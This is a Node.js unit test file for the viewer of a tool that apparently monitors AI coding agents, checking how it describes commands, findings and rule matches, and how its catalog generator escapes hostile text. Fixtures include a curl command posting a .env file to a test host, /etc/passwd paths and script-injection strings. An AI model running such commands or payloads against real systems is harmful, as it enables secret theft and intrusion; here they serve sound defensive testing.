#!/usr/bin/env node
//
// Unit tests for the viewer's pure record-description logic.
//
//   node test/viewer-logic.js
//
// The viewer is a single self-contained HTML file with no build step and no
// module system, so there is nothing to import. This lifts the block between
// the [describe:begin] / [describe:end] markers in viewer/viewer.html and
// evaluates it in isolation. That block is required to be self-contained: if
// it ever reaches for the DOM, a global, or a helper defined elsewhere in the
// file, these tests fail loudly rather than silently testing a stub.
//
// All fixtures are generated inline. No temp files, no external data.

"use strict";

var fs = require("fs");
var path = require("path");

var VIEWER = path.join(__dirname, "..", "viewer", "viewer.html");

/* ── extract the pure block ─────────────────────────────────────────────── */

var HTML;
try { HTML = fs.readFileSync(VIEWER, "utf8"); }
catch(e){ bail("cannot read " + VIEWER + " — " + e.message); }

// Lift the source between a pair of /* [name:begin] */ ... /* [name:end] */
// markers. Each marked block is required to be self-contained: if it reaches
// for the DOM, a global, or a helper defined elsewhere in the file, evaluating
// it here fails loudly rather than silently testing a stub.
function blockSrc(name){
  var BEGIN = "/* [" + name + ":begin] */", END = "/* [" + name + ":end] */";
  var a = HTML.indexOf(BEGIN), b = HTML.indexOf(END);
  if(a === -1 || b === -1 || b < a)
    bail("could not find the [" + name + ":begin]/[" + name + ":end] markers in viewer/viewer.html");
  return HTML.slice(a + BEGIN.length, b);
}

function loadBlock(name, wants){
  var src = blockSrc(name);
  for(var i = 0; i < wants.length; i++){
    if(!(new RegExp("(function\\s+" + wants[i] + "\\s*\\(|var\\s+" + wants[i] + "\\s*=)")).test(src))
      bail("the [" + name + "] block does not define " + wants[i]);
  }
  // Sloppy-mode globals would leak here; "use strict" makes that a ReferenceError.
  try {
    return new Function('"use strict";' + src +
                        "\nreturn {" + wants.map(function(w){ return w + ":" + w; }).join(",") + "};")();
  } catch(e){
    bail("the [" + name + "] block failed to evaluate standalone — " + e.message);
  }
}

function bail(msg){
  process.stderr.write("FATAL: " + msg + "\n");
  process.exit(2);
}

var describe  = loadBlock("describe",  ["describe"]).describe;
var interpret = loadBlock("interpret", ["interpret"]).interpret;
var rollup    = loadBlock("rollup",    ["rollup"]).rollup;

var exBlock    = loadBlock("explain", ["explain", "buildIndex"]);
var explain    = exBlock.explain;
var buildIndex = exBlock.buildIndex;

var sizeBlock = loadBlock("sizeguard", ["MAX_BYTES", "overSize", "hdrSize"]);
var MAX_BYTES = sizeBlock.MAX_BYTES, overSize = sizeBlock.overSize, hdrSize = sizeBlock.hdrSize;

var catBlock  = loadBlock("rulecat", ["RULECAT", "RULECAT_META"]);
var RULECAT   = catBlock.RULECAT;
var RULECAT_META = catBlock.RULECAT_META;

/* ── tiny harness ───────────────────────────────────────────────────────── */

var pass = 0, failures = [];

function eq(label, actual, expected){
  if(actual === expected) { pass++; return; }
  failures.push(label + "\n      expected: " + JSON.stringify(expected) +
                        "\n      actual:   " + JSON.stringify(actual));
}
function ok(label, cond, detail){
  if(cond) { pass++; return; }
  failures.push(label + (detail ? "\n      " + detail : ""));
}

/* ── the record types in the spec table ─────────────────────────────────── */

eq("event/command.exec names the command",
   describe({ record_type:"event", event_type:"command.exec", tool_name:"Bash", command:"npm test" }),
   "Proposed a shell command: npm test");

eq("event/command.exec falls back to the tool when no command is present",
   describe({ record_type:"event", event_type:"command.exec", tool_name:"Bash" }),
   "Proposed a command via Bash");

eq("event/command.exec reads the legacy observed_command field",
   describe({ record_type:"event", event_type:"command.exec", observed_command:"rm -rf /tmp/x" }),
   "Proposed a shell command: rm -rf /tmp/x");

eq("event/command.result exit 0 reports success",
   describe({ record_type:"event", event_type:"command.result", exit_code:0 }),
   "Command finished (exit 0)");

eq("event/command.result exit 1 reports the code",
   describe({ record_type:"event", event_type:"command.result", exit_code:1 }),
   "Command finished (exit 1)");

eq("event/command.result exit 137 reports the code",
   describe({ record_type:"event", event_type:"command.result", exit_code:137 }),
   "Command finished (exit 137)");

eq("event/file.read names the file",
   describe({ record_type:"event", event_type:"file.read", file_path:"src/lib/auth.js" }),
   "Asked to read a file: src/lib/auth.js");

eq("event/file.write names the file",
   describe({ record_type:"event", event_type:"file.write", file_path:"src/lib/auth.js" }),
   "Asked to write a file: src/lib/auth.js");

eq("event/session.start",
   describe({ record_type:"event", event_type:"session.start" }),
   "Session started");

eq("event/prompt.user",
   describe({ record_type:"event", event_type:"prompt.user" }),
   "Operator sent a prompt");

eq("event/tool.call names an MCP tool",
   describe({ record_type:"event", event_type:"tool.call", tool_name:"mcp__slack__send_message" }),
   "Called the mcp__slack__send_message tool");

eq("event/network.indicator reduces a URL to its host",
   describe({ record_type:"event", event_type:"network.indicator",
              url:"https://evil.example.com/a/b?c=d#e" }),
   "Matched a URL: evil.example.com");

eq("finding pairs title with rule",
   describe({ record_type:"finding", title:"Credential exfiltration chain", rule_id:"chain.exfil.01" }),
   "Credential exfiltration chain — matched chain.exfil.01");

eq("enforcement deny",
   describe({ record_type:"enforcement", decision:"deny", deny_rule_id:"net.egress.block" }),
   "Blocked an action: net.egress.block");

// numbat's real enforcement records use decision:"no_override" with rule_ids[]
// and reason:"monitor_mode" — there is no deny_rule_id outside the spec table.
eq("enforcement in monitor mode says it did not act",
   describe({ record_type:"enforcement", decision:"no_override", mode:"monitor",
              reason:"monitor_mode", rule_ids:["tamper.detector_state_write"] }),
   "Did not intervene (monitor mode): tamper.detector_state_write");

eq("enforcement summarises multiple rule_ids",
   describe({ record_type:"enforcement", decision:"deny", rule_ids:["a.rule","b.rule","c.rule"] }),
   "Blocked an action: a.rule +2 more");

eq("enforcement prefers deny_rule_id when both are present",
   describe({ record_type:"enforcement", decision:"deny",
              deny_rule_id:"net.egress.block", rule_ids:["other.rule"] }),
   "Blocked an action: net.egress.block");

eq("an unknown decision is de-underscored rather than echoed raw",
   describe({ record_type:"enforcement", decision:"soft_warn", reason:"rate_limited" }),
   "Enforcement decision: soft warn: rate limited");

eq("a finding falls back to rule_ids when rule_id is absent",
   describe({ record_type:"finding", title:"Agent targeted numbat's state directory",
              rule_ids:["tamper.detector_state_write"] }),
   "Agent targeted numbat's state directory — matched tamper.detector_state_write");

eq("an empty rule_ids array does not fabricate a rule",
   describe({ record_type:"finding", title:"Something happened", rule_ids:[] }),
   "Something happened");

eq("a rule_ids array of nulls does not fabricate a rule",
   describe({ record_type:"finding", title:"Something happened", rule_ids:[null,null] }),
   "Something happened");

eq("indicator counts occurrences",
   describe({ record_type:"indicator", type:"domain", value:"api.supabase.com", count:3 }),
   "Extracted domain api.supabase.com, 3 times");

// describe() and explain() must not disagree about what an indicator is: one
// says it in the row, the other in the pane directly below it.
ok("describe() does not claim numbat observed the indicator itself",
   !/\bSaw\b/.test(describe({ record_type:"indicator", type:"email", value:"git@github.com", count:1 })));

// ", 1 time" was on 106 of 106 indicator rows and never distinguished any of
// them; a count that differs from one still earns its width.
eq("a count of one is not printed",
   describe({ record_type:"indicator", type:"url", value:"https://x.test/y", count:1 }),
   "Extracted url https://x.test/y");

eq("scan_summary",
   describe({ record_type:"scan_summary", status:"clean" }),
   "Scan finished: clean");

eq("diagnostic surfaces the message",
   describe({ record_type:"diagnostic", level:"warn", message:"state.db locked, retrying" }),
   "state.db locked, retrying");

/* ── duration, since this corpus carries no exit codes ──────────────────── */

eq("command.result with no exit code reports duration instead of guessing",
   describe({ record_type:"event", event_type:"command.result", duration_ms:1019 }),
   "Command finished after 1.0 s");

eq("sub-second duration stays in milliseconds",
   describe({ record_type:"event", event_type:"command.result", duration_ms:43 }),
   "Command finished after 43 ms");

// It used to round to "2 min", silently discarding the 5 seconds the record
// carries. A forensic tool should not round away data it was given.
eq("a multi-minute duration keeps its seconds",
   describe({ record_type:"event", event_type:"command.result", duration_ms:125000 }),
   "Command finished after 2 min 5 s");

eq("command.result with neither exit code nor duration claims nothing",
   describe({ record_type:"event", event_type:"command.result" }),
   "Command finished");

ok("command.result never invents success when there is no exit code",
   describe({ record_type:"event", event_type:"command.result", duration_ms:5 }).indexOf("success") === -1);

/* ── long paths are shortened, not dropped ──────────────────────────────── */

(function(){
  var long = "/Users/someone/.superset/worktrees/8635b301-bd9e-4456-aa67-78f676170d23/" +
             "admin-pages-bug-audit/sh-dashboard/src/middleware.js";
  var out = describe({ record_type:"event", event_type:"file.read", file_path:long });
  eq("a long path collapses to its last two segments", out, "Asked to read a file: …/src/middleware.js");
})();

/* ── degraded, partial and hostile records ──────────────────────────────── */

eq("a record with only record_type still describes itself (finding)",
   describe({ record_type:"finding" }), "Recorded a finding");
eq("a record with only record_type still describes itself (indicator)",
   describe({ record_type:"indicator" }), "Extracted an indicator");
eq("a record with only record_type still describes itself (scan_summary)",
   describe({ record_type:"scan_summary" }), "Scan finished");
eq("a record with only record_type still describes itself (enforcement)",
   describe({ record_type:"enforcement" }), "Recorded an enforcement decision");
eq("a record with only record_type still describes itself (diagnostic)",
   describe({ record_type:"diagnostic" }), "Diagnostic record with no message");
eq("an event with no event_type is still honest",
   describe({ record_type:"event" }), "Unrecognized record (event)");

eq("an empty object is named honestly",
   describe({}), "Unrecognized record (no record_type)");

eq("an unknown record_type is echoed back",
   describe({ record_type:"telemetry_blob" }), "Unrecognized record (telemetry_blob)");

eq("an unknown event_type degrades with whatever context exists",
   describe({ record_type:"event", event_type:"file.chmod", file_path:"/etc/passwd" }),
   "Recorded a file.chmod event: /etc/passwd");

eq("all-null fields degrade instead of printing null",
   describe({ record_type:null, event_type:null, tool_name:null, command:null,
              file_path:null, exit_code:null, title:null, rule_id:null,
              value:null, count:null, message:null, status:null, decision:null }),
   "Unrecognized record (no record_type)");

eq("null fields inside a known record type degrade cleanly",
   describe({ record_type:"event", event_type:"command.exec", command:null, tool_name:null }),
   "Proposed a shell command");

eq("a non-object is rejected without throwing (null)", describe(null), "Unrecognized record");
eq("a non-object is rejected without throwing (undefined)", describe(undefined), "Unrecognized record");
eq("a non-object is rejected without throwing (array)", describe([1,2,3]), "Unrecognized record");
eq("a non-object is rejected without throwing (string)", describe("hello"), "Unrecognized record");
eq("a non-object is rejected without throwing (number)", describe(42), "Unrecognized record");

eq("object-valued fields never leak [object Object] into the sentence",
   describe({ record_type:"event", event_type:"command.exec", command:{ nested:true } }),
   "Proposed a shell command");

eq("whitespace and newlines collapse to a single line",
   describe({ record_type:"event", event_type:"command.exec", command:"npm  test\n\n--watch" }),
   "Proposed a shell command: npm test --watch");

/* ── truncation: a 10KB command must not produce a 10KB sentence ────────── */

(function(){
  var huge = "curl " + "A".repeat(10 * 1024);
  var out = describe({ record_type:"event", event_type:"command.exec", command:huge });
  ok("a 10KB command is truncated", out.length < 200,
     "got " + out.length + " chars");
  ok("the truncated command is marked with an ellipsis", out.slice(-1) === "…", JSON.stringify(out.slice(-20)));
  ok("the truncated command keeps its leading context", out.indexOf("Proposed a shell command: curl ") === 0);
})();

(function(){
  var hugeTitle = "T".repeat(10 * 1024);
  var out = describe({ record_type:"finding", title:hugeTitle, rule_id:"r.1" });
  ok("a huge finding title is truncated", out.length < 200, "got " + out.length + " chars");
  ok("a truncated finding still names its rule", out.indexOf("matched r.1") !== -1, out);
})();

/* ── invariants across every fixture ────────────────────────────────────── */

var CORPUS = [
  {}, null, undefined, [], "x", 0, true,
  { record_type:"event" },
  { record_type:"event", event_type:"command.exec", command:"ls" },
  { record_type:"event", event_type:"command.result", duration_ms:0 },
  { record_type:"event", event_type:"tool.result", tool_name:"Skill" },
  { record_type:"event", event_type:"session.end" },
  { record_type:"event", event_type:"message.assistant" },
  { record_type:"event", event_type:"file.delete", file_path:"/x" },
  { record_type:"finding" }, { record_type:"enforcement", decision:"allow" },
  { record_type:"indicator", count:0 }, { record_type:"scan_summary" },
  { record_type:"diagnostic" }, { record_type:"zzz" },
  { record_type:"event", event_type:"network.indicator" },
  { record_type:"event", event_type:"command.result", exit_code:-9 },
  { record_type:"indicator", type:"domain", value:"a.test", count:1.5 },
  { record_type:"event", event_type:"command.exec", command:"" },
  { record_type:"event", event_type:"file.read", file_path:"" }
];

CORPUS.forEach(function(rec, i){
  var out;
  try { out = describe(rec); }
  catch(e){ failures.push("describe() threw on corpus[" + i + "]: " + e.message); return; }
  ok("corpus[" + i + "] returns a string", typeof out === "string", "got " + typeof out);
  ok("corpus[" + i + "] is never empty", typeof out === "string" && out.trim().length > 0,
     JSON.stringify(out));
  ok("corpus[" + i + "] is never 'undefined'/'null' text",
     typeof out === "string" && out.indexOf("undefined") === -1 && out.indexOf("[object") === -1,
     JSON.stringify(out));
});

/* ── purity ─────────────────────────────────────────────────────────────── */

(function(){
  var rec = { record_type:"event", event_type:"command.exec", command:"npm test", tool_name:"Bash" };
  var snapshot = JSON.stringify(rec);
  var first = describe(rec);
  ok("describe() does not mutate its argument", JSON.stringify(rec) === snapshot);
  eq("describe() is deterministic", describe(rec), first);

  var frozen = Object.freeze({ record_type:"finding", title:"t", rule_id:"r" });
  eq("describe() works on a frozen record", describe(frozen), "t — matched r");
})();

ok("describe() runs with no DOM present", typeof globalThis.document === "undefined");

/* ── escaping is the caller's job; describe must pass text through intact ── */

(function(){
  var xss = '<img src=x onerror=alert(1)>';
  var out = describe({ record_type:"event", event_type:"command.exec", command:"echo " + xss });
  ok("describe() returns markup verbatim so esc() remains the single escape point",
     out.indexOf(xss) !== -1, out);
  ok("describe() does not pre-escape (that would double-escape in the row)",
     out.indexOf("&lt;") === -1, out);
})();

/* ── the embedded rule catalog ──────────────────────────────────────────── */

var RULE_IDS = Object.keys(RULECAT);

ok("the catalog is not empty", RULE_IDS.length > 0, "got " + RULE_IDS.length);
ok("the catalog records the numbat commit it was generated from",
   /^[0-9a-f]{40}$/.test(String(RULECAT_META.sha)), JSON.stringify(RULECAT_META.sha));

// viewer.html ships publicly. Provenance must name the upstream source, never
// the machine that generated it — an absolute path would leak the maintainer's
// username and make two regenerations from identical input differ.
(function(){
  var meta = JSON.stringify(RULECAT_META);
  ok("the catalog carries no absolute filesystem path",
     !/"\/(Users|home|root|var|tmp)\//.test(meta) && meta.indexOf(":\\\\") === -1, meta);
  ok("the catalog names its upstream source rather than a local directory",
     /^https?:\/\//.test(String(RULECAT_META.source)) || RULECAT_META.source === "unknown",
     JSON.stringify(RULECAT_META.source));
  // the whole generated block, not just the metadata object
  ok("the generated block contains no home-directory path",
     !/\/Users\/[a-z]|\/home\/[a-z]/i.test(blockSrc("rulecat")));
})();
eq("the metadata rule count matches the catalog", RULECAT_META.rules, RULE_IDS.length);

(function(){
  var bad = [];
  RULE_IDS.forEach(function(id){
    var r = RULECAT[id];
    if(!r || typeof r !== "object"){ bad.push(id + ": not an object"); return; }
    ["v","sev","kind","t","d"].forEach(function(k){
      if(typeof r[k] !== "string" || !r[k].trim()) bad.push(id + ": missing " + k);
    });
    if(r.kind !== "expr" && r.kind !== "sequence") bad.push(id + ": bad kind " + r.kind);
    if(!Array.isArray(r.g)) bad.push(id + ": tags not an array");
  });
  ok("every catalog entry carries the fields interpret() relies on",
     bad.length === 0, bad.slice(0, 5).join("; "));
})();

// The catalog is executable JavaScript inside a <script> element. These are the
// sequences that would let rule text escape its string literal.
(function(){
  var raw = blockSrc("rulecat");
  ok("the generated catalog contains no raw </script", raw.indexOf("</script") === -1);
  ok("the generated catalog contains no raw <!--", raw.indexOf("<!--") === -1);
  ok("the generated catalog contains no raw U+2028/U+2029",
     !(new RegExp("[" + String.fromCharCode(0x2028) + String.fromCharCode(0x2029) + "]")).test(raw));
})();

/* ── interpret(): fixtures are built FROM the catalog ───────────────────────
 *
 * Hand-written rule metadata would let the catalog and these tests drift apart,
 * so a regeneration that changes a description would fail nothing. Every
 * fixture below reads its rule's real version, severity and text out of
 * RULECAT.
 */

function findingFor(id, over){
  var r = RULECAT[id];
  var f = { record_type:"finding", rule_id:id, rule_version:r.v, title:r.t,
            severity:r.sev, confidence:"medium", source_type:"hook",
            observed_event_type:"command.exec", observed_actor:"assistant",
            observed_command:"echo hi", redacted:false };
  if(over) Object.keys(over).forEach(function(k){ f[k] = over[k]; });
  return f;
}

var EXPR_ID = RULE_IDS.filter(function(i){ return RULECAT[i].kind === "expr"; })[0];
var SEQ_ID  = RULE_IDS.filter(function(i){ return RULECAT[i].kind === "sequence"; })[0];

ok("the catalog contains at least one single-event rule", !!EXPR_ID);
ok("the catalog contains at least one chain rule", !!SEQ_ID);

eq("interpret() declines an event", interpret({ record_type:"event", event_type:"command.exec" }, RULECAT), null);
eq("interpret() declines an indicator", interpret({ record_type:"indicator" }, RULECAT), null);
eq("interpret() declines an enforcement record", interpret({ record_type:"enforcement", decision:"deny" }, RULECAT), null);

(function(){
  var bad = [];
  RULE_IDS.forEach(function(id){
    var ip = interpret(findingFor(id), RULECAT);
    if(!ip){ bad.push(id + ": null"); return; }
    if(!ip.looksFor){ bad.push(id + ": no description"); return; }
    if(ip.looksFor.stale) bad.push(id + ": stale against its own version");
    if(ip.looksFor.text !== RULECAT[id].d.slice(0, ip.looksFor.text.length).replace(/…$/, "") &&
       ip.looksFor.text.indexOf(RULECAT[id].d.slice(0, 40)) !== 0)
      bad.push(id + ": description does not come from the catalog");
  });
  ok("every catalog rule interprets at its own version with no staleness flag",
     bad.length === 0, bad.slice(0, 5).join("; "));
})();

(function(){
  var ip = interpret(findingFor(EXPR_ID, { rule_version: RULECAT[EXPR_ID].v + ".9" }), RULECAT);
  ok("a version mismatch is flagged stale", ip.looksFor.stale === true);
  eq("the stale marker reports the catalog's version", ip.looksFor.catV, RULECAT[EXPR_ID].v);
  eq("the stale marker reports the record's version", ip.looksFor.recV, RULECAT[EXPR_ID].v + ".9");
  ok("the description is still shown when stale", ip.looksFor.text.length > 0);
})();

// The real day-one case: ~/numbat-policy ships a same-id override of
// tamper.guardrails_off at version 99.0, which no generated catalog can match.
(function(){
  var id = "tamper.guardrails_off";
  if(!Object.prototype.hasOwnProperty.call(RULECAT, id)){
    failures.push("expected " + id + " in the catalog — the day-one staleness case is untested");
    return;
  }
  var ip = interpret(findingFor(id, { rule_version:"99.0" }), RULECAT);
  ok("the numbat-policy 99.0 override is flagged stale", ip.looksFor.stale === true);
  eq("it reports the record's version", ip.looksFor.recV, "99.0");
  ok("it does not claim the catalog is at 99.0", ip.looksFor.catV !== "99.0");
})();

(function(){
  var ip = interpret({ record_type:"finding", rule_id:"operator.custom_thing",
                       rule_version:"2.0", title:"Custom", severity:"high" }, RULECAT);
  eq("an uncatalogued rule yields no description", ip.looksFor, null);
  ok("an uncatalogued rule says so", ip.limits.join(" ").indexOf("not in this viewer's catalog") !== -1,
     JSON.stringify(ip.limits));
  ok("an uncatalogued rule makes no claim about how it matches",
     ip.whyFired.text.indexOf("cannot be shown") !== -1, ip.whyFired.text);
})();

/* the closed condition set */

(function(){
  var ip = interpret(findingFor(EXPR_ID), RULECAT);
  ok("a live hook command.exec says numbat saw it before it ran",
     ip.limits.join(" ").indexOf("before it ran") !== -1, JSON.stringify(ip.limits));
})();

// file.write arrives from both the pre- and post-tool hook, so it establishes
// no ordering and must not carry a pre-action claim.
(function(){
  var ip = interpret(findingFor(EXPR_ID, { observed_event_type:"file.write" }), RULECAT);
  ok("a hook file.write makes no pre-action claim",
     ip.limits.join(" ").indexOf("before it ran") === -1, JSON.stringify(ip.limits));
})();
(function(){
  var ip = interpret(findingFor(EXPR_ID, { observed_event_type:"file.delete" }), RULECAT);
  ok("a hook file.delete makes no pre-action claim",
     ip.limits.join(" ").indexOf("before it ran") === -1, JSON.stringify(ip.limits));
})();

// An at-rest scan finding is reconstructed after the fact and carries no
// pre-action claim at all.
(function(){
  var ip = interpret(findingFor(EXPR_ID, { source_type:"artifact" }), RULECAT);
  ok("an at-rest artifact finding never claims numbat saw it first",
     ip.limits.join(" ").indexOf("before it ran") === -1, JSON.stringify(ip.limits));
  ok("an at-rest artifact finding says it was reconstructed",
     ip.limits.join(" ").indexOf("Reconstructed") !== -1, JSON.stringify(ip.limits));
})();
(function(){
  var ip = interpret(findingFor(EXPR_ID, { source_type:"otel" }), RULECAT);
  ok("an otel finding never claims numbat saw it first",
     ip.limits.join(" ").indexOf("saw this before it ran") === -1, JSON.stringify(ip.limits));
})();

(function(){
  var a = interpret(findingFor(EXPR_ID, { observed_actor:"assistant" }), RULECAT);
  var u = interpret(findingFor(EXPR_ID, { observed_actor:"user" }), RULECAT);
  var s = interpret(findingFor(EXPR_ID, { observed_actor:"system" }), RULECAT);
  var n = interpret(findingFor(EXPR_ID, { observed_actor:undefined }), RULECAT);
  // numbat stamps hook and otel events as actor "assistant" by construction
  // (hook.go:995), so the record establishes that the agent issued the call —
  // not that the operator did not ask for it.
  ok("an assistant actor says the agent issued it",
     a.limits.join(" ").indexOf("issued this tool call itself") !== -1, JSON.stringify(a.limits));
  ok("an assistant actor does not deny operator involvement",
     a.limits.join(" ").indexOf("does not mean the operator did not ask for it") !== -1, JSON.stringify(a.limits));
  /* interpret() and explain() are one click apart — every finding links its
     cited events, every cited event links back. The same fact must not arrive
     in two voices, and a comment in explain() asserts it does not. */
  (function(){
    var ipSaid = a.limits.filter(function(l){ return /issued this tool call/.test(l); })[0] || "";
    var exSaid = (explain({ record_type:"event", event_type:"command.exec", actor:"assistant" },
                          buildIndex([])).limits || [])
                 .filter(function(l){ return /issued this tool call/.test(l); })[0] || "";
    eq("interpret() and explain() word the actor fact identically", exSaid, ipSaid);
    ok("and that wording is non-empty", ipSaid.length > 0, ipSaid);
  })();
  ok("a user actor attributes it to the operator",
     u.limits.join(" ").indexOf("came from the operator") !== -1, JSON.stringify(u.limits));
  ok("a system actor claims neither", s.limits.join(" ").indexOf("operator") === -1, JSON.stringify(s.limits));
  ok("an absent actor claims neither", n.limits.join(" ").indexOf("operator") === -1, JSON.stringify(n.limits));
})();

(function(){
  var ip = interpret(findingFor(SEQ_ID), RULECAT);
  ok("a chain rule says it correlated several events",
     ip.whyFired.text.indexOf("chain rule matched") !== -1, ip.whyFired.text);
  ok("a chain rule disclaims data flow between steps",
     ip.limits.join(" ").indexOf("not that data from an earlier step") !== -1, JSON.stringify(ip.limits));
  // What numbat establishes is the order it OBSERVED events in, which is a
  // hair weaker than the order they occurred in.
  ok("a chain rule claims observed order, not actual order",
     ip.limits.join(" ").indexOf("numbat observed the steps in that order") !== -1, JSON.stringify(ip.limits));
  // observed_* on a chain finding is the completing event only (finding.go:83).
  ok("a chain finding marks its observed value as the final step",
     ip.sawHere.finalStep === true);
  ok("a single-event finding does not claim a final step",
     interpret(findingFor(EXPR_ID), RULECAT).sawHere.finalStep === false);
  ok("a chain rule does not imply the whole chain was caught before running",
     ip.limits.join(" ").indexOf("earlier steps in the chain had already happened") !== -1,
     JSON.stringify(ip.limits));
  var single = interpret(findingFor(EXPR_ID), RULECAT);
  ok("a single-event rule says so", single.whyFired.text.indexOf("A single event matched") !== -1);
  ok("a single-event rule makes no chain disclaimer",
     single.limits.join(" ").indexOf("earlier step") === -1);
})();

// numbat defines confidence as how DIRECTLY evidence supports the observation
// (event.go:104), not as certainty that the rule matched — rule evaluation is
// exact CEL. Claiming match-uncertainty would misstate the schema's most
// misread field, on every finding.
(function(){
  var ip = interpret(findingFor(EXPR_ID, { confidence:"medium" }), RULECAT);
  var joined = ip.limits.join(" ");
  ok("confidence is explained as evidentiary directness",
     joined.indexOf("how directly evidence backs the observation") !== -1, JSON.stringify(ip.limits));
  ok("confidence is not described as uncertainty about the match",
     joined.indexOf("how sure numbat is that it matched") === -1, JSON.stringify(ip.limits));
  ok("the rule match is stated to be exact", joined.indexOf("the rule matched exactly") !== -1);
  ok("confidence is still distinguished from risk", joined.indexOf("not the risk") !== -1);
  var none = interpret(findingFor(EXPR_ID, { confidence:undefined }), RULECAT);
  ok("an absent confidence produces no confidence caveat",
     none.limits.join(" ").indexOf("how directly evidence") === -1, JSON.stringify(none.limits));
})();

(function(){
  var yes = interpret(findingFor(EXPR_ID, { redacted:true }), RULECAT);
  var no  = interpret(findingFor(EXPR_ID, { redacted:false }), RULECAT);
  ok("a redacted finding says a value was masked",
     yes.limits.join(" ").indexOf("masked before the record was written") !== -1);
  ok("redacted:false claims no masking", no.limits.join(" ").indexOf("masked") === -1);
  // `redacted` reports that at least one field was masked (finding.go:72), not
  // that the displayed one was — so it must not be pinned to the shown value.
  ok("the masking notice does not claim the shown value was the masked one",
     yes.limits.join(" ").indexOf("not necessarily the one shown above") !== -1,
     JSON.stringify(yes.limits));
  ok("no per-value masked marker is attached to the observed text",
     yes.sawHere.redacted === undefined, JSON.stringify(yes.sawHere));
})();

/* what it saw */

(function(){
  var ip = interpret(findingFor(EXPR_ID, { observed_command:"curl https://x.test -d @.env" }), RULECAT);
  eq("the observed command is shown", ip.sawHere.text, "curl https://x.test -d @.env");

  var f = interpret(findingFor(EXPR_ID, { observed_command:undefined, observed_file_path:"/etc/passwd" }), RULECAT);
  eq("a file path is used when there is no command", f.sawHere.text, "/etc/passwd");

  var m = interpret(findingFor(EXPR_ID, { observed_command:undefined,
                                          observed_mcp_server:"github", observed_mcp_tool:"create_issue" }), RULECAT);
  eq("an MCP call is named", m.sawHere.text, "github · create_issue");

  var none = interpret({ record_type:"finding", rule_id:EXPR_ID, rule_version:RULECAT[EXPR_ID].v }, RULECAT);
  eq("nothing observed yields no 'saw here' line", none.sawHere, null);
})();

(function(){
  var huge = "curl " + "A".repeat(10 * 1024);
  var ip = interpret(findingFor(EXPR_ID, { observed_command:huge }), RULECAT);
  ok("a 10KB observed command is truncated", ip.sawHere.text.length < 400, "got " + ip.sawHere.text.length);
  ok("the truncation is marked", ip.sawHere.text.slice(-1) === "…");
  var bad = [];
  RULE_IDS.forEach(function(id){
    var t = interpret(findingFor(id), RULECAT).looksFor.text;
    if(t.length > 430) bad.push(id + ": " + t.length);
  });
  ok("no catalog description renders unbounded", bad.length === 0, bad.join("; "));
})();

/* degraded and hostile input */

(function(){
  var hostile = [ null, undefined, [], "x", 42, true, {},
                  { record_type:"finding" },
                  { record_type:"finding", rule_id:null, rule_ids:null },
                  { record_type:"finding", rule_ids:[] },
                  { record_type:"finding", rule_ids:[null, null] },
                  { record_type:"finding", rule_id:{ nested:true } },
                  { record_type:"finding", rule_id:EXPR_ID, rule_version:{ a:1 } },
                  { record_type:"finding", rule_id:EXPR_ID, observed_command:{ a:1 } },
                  { record_type:"finding", rule_id:EXPR_ID, confidence:[1,2] } ];

  hostile.forEach(function(rec, i){
    var ip;
    try { ip = interpret(rec, RULECAT); }
    catch(e){ failures.push("interpret() threw on hostile[" + i + "]: " + e.message); return; }
    if(ip === null){ pass++; return; }
    ok("hostile[" + i + "] returns limits as an array", Array.isArray(ip.limits));
    ok("hostile[" + i + "] returns a why string", typeof ip.whyFired.text === "string" && ip.whyFired.text.length > 0);
    var all = JSON.stringify(ip);
    ok("hostile[" + i + "] leaks no undefined/[object", all.indexOf("undefined") === -1 && all.indexOf("[object") === -1, all.slice(0, 160));
  });
})();

(function(){
  var f = findingFor(EXPR_ID);
  ok("interpret() tolerates a missing catalog", interpret(f, undefined) !== null);
  eq("with no catalog there is no description", interpret(f, undefined).looksFor, null);
  ok("interpret() tolerates a non-object catalog", interpret(f, "nope") !== null);
  ok("interpret() tolerates an array catalog", interpret(f, [1,2]) !== null);
  ok("a catalog entry that is not an object is ignored",
     interpret(f, (function(){ var c = {}; c[EXPR_ID] = "nope"; return c; })()).looksFor === null);
})();

/* purity and the escaping contract */

(function(){
  var rec = findingFor(EXPR_ID);
  var snapshot = JSON.stringify(rec);
  var first = JSON.stringify(interpret(rec, RULECAT));
  ok("interpret() does not mutate its argument", JSON.stringify(rec) === snapshot);
  eq("interpret() is deterministic", JSON.stringify(interpret(rec, RULECAT)), first);
  ok("interpret() works on a frozen record", interpret(Object.freeze(findingFor(EXPR_ID)), RULECAT) !== null);
  ok("interpret() runs with no DOM present", typeof globalThis.document === "undefined");
})();

(function(){
  var xss = '<img src=x onerror=alert(1)>';
  var ip = interpret(findingFor(EXPR_ID, { observed_command:"echo " + xss }), RULECAT);
  ok("interpret() returns markup verbatim so esc() stays the single escape point",
     ip.sawHere.text.indexOf(xss) !== -1, ip.sawHere.text);
  ok("interpret() does not pre-escape", ip.sawHere.text.indexOf("&lt;") === -1);
})();

/* ── the generator's injection defences ─────────────────────────────────────
 *
 * Called directly rather than through a temp rules directory: the escaping is
 * the security boundary, so it is tested as a unit.
 */

var gen = require(path.join(__dirname, "..", "tools", "gen-rule-catalog.js"));

(function(){
  var LS = String.fromCharCode(0x2028), PS = String.fromCharCode(0x2029);
  var cases = [
    '</script><script>alert(1)</script>',
    '<!-- <script> -->',
    'back`tick and ${interpolation}',
    'quote " and backslash \\ and newline \n',
    'line' + LS + 'sep' + PS + 'end',
    String.fromCharCode(0,31) + " control chars"
  ];
  cases.forEach(function(s, i){
    var out = gen.jsonSafe(s);
    ok("jsonSafe[" + i + "] emits no raw </script", out.indexOf("</script") === -1, out);
    ok("jsonSafe[" + i + "] emits no raw <!--", out.indexOf("<!--") === -1, out);
    ok("jsonSafe[" + i + "] emits no raw line terminator",
       out.indexOf(LS) === -1 && out.indexOf(PS) === -1);
    var back;
    try { back = JSON.parse(out); }
    catch(e){ failures.push("jsonSafe[" + i + "] did not emit valid JSON: " + e.message); return; }
    eq("jsonSafe[" + i + "] round-trips exactly", back, s);
  });
})();

// A deliberately hostile rule file must not be able to inject script.
(function(){
  var yaml = [
    'id: evil.injection',
    'version: "1.0"',
    'enabled: true',
    'title: Evil rule',
    'description: |-',
    '  </script><script>alert(document.domain)</script>',
    '  and a backtick ` and ${x}',
    'severity: high',
    'tags: [evil]'
  ].join("\n");

  var r = gen.parseRuleYAML(yaml);
  eq("the hostile rule still parses its id", r.id, "evil.injection");
  ok("the hostile description is captured", r.description.indexOf("alert(document.domain)") !== -1);

  var rules = { "evil.injection": { v:r.version, sev:r.severity, kind:"expr",
                                    t:r.title, d:r.description, g:r.tags } };
